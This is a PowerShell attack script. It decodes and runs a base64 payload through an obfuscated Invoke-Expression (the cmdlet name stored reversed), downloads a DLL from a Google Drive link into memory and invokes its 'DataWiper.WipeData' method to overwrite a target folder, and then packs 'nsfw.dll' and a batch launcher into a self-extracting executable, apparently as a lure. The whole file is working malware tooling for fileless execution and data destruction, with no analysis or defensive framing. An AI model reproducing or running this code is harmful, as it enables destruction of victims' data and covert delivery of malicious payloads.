# Gather host info
$hostinfo = Get-Host
$lang = $hostinfo.CurrentCulture.DisplayName

# Base64 payload (PowerShell command, update as needed)
$t1 = @"
<YOUR_BASE64_STRING>
"@
$t2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($t1))
$t3 = "noiSSerpxE-eKOvNI"
$t4 = ([regex]::Matches($t3, '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
&($t4) $t2

Write-Host "This has been downloaded off a remote server and executed."

# Download the DLL into memory
$url = "https://drive.google.com/file/d/1zdt7K5ytNxMtdl5uUzgGW3Gj4oNxYHX5/view?usp=drive_link"
$webClient = New-Object System.Net.WebClient
$dllBytes = $webClient.DownloadData($url)

# Load the DLL into memory using .NET Reflection
$assembly = [System.Reflection.Assembly]::Load($dllBytes)

# Find the class and method (adjust if needed)
$type = $assembly.GetType("DataWiper")
$method = $type.GetMethod("WipeData")

# Set wipe parameters
$targetPath = "C:\SensitiveData"  # Replace with actual target
$passes = 3

# Invoke method from memory-loaded assembly
$result = $method.Invoke($null, @($targetPath, $passes))

if ($result) {
    Write-Host "Wipe operation succeeded."
} else {
    Write-Host "Wipe operation failed."
}

# Powershell to create self-extracting bundle
$files = "nsfw.dll", "launch.bat"
& .\7z.exe a -t7z payload.7z $files
cmd /c "copy /b 7z.sfx + config.txt + payload.7z win32.exe"
Write-Host "✅ Created: DataWiperSFX.exe"
